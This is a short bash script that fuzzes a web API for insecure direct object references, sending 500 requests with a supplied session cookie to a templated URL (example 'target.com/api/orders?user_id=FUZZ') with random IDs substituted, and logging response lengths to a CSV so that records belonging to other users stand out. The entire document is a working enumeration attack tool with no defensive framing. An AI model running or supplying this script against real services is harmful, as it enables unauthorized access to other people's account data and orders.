#!/bin/bash

URL_TEMPLATE=$1 # e.g. "https://target.com/api/orders?user_id=FUZZ"
COOKIE=$2

for i in $(seq 1 500); do
  ID=$((RANDOM % 5000))
  RESP=$(curl -s -H "Cookie: $COOKIE" "${URL_TEMPLATE/FUZZ/$ID}")
  LEN=${#RESP}
  echo "$ID,$LEN" >> idor_results.csv
done
# then eyeball idor_results.csv for response lengths that don't match "not found" length

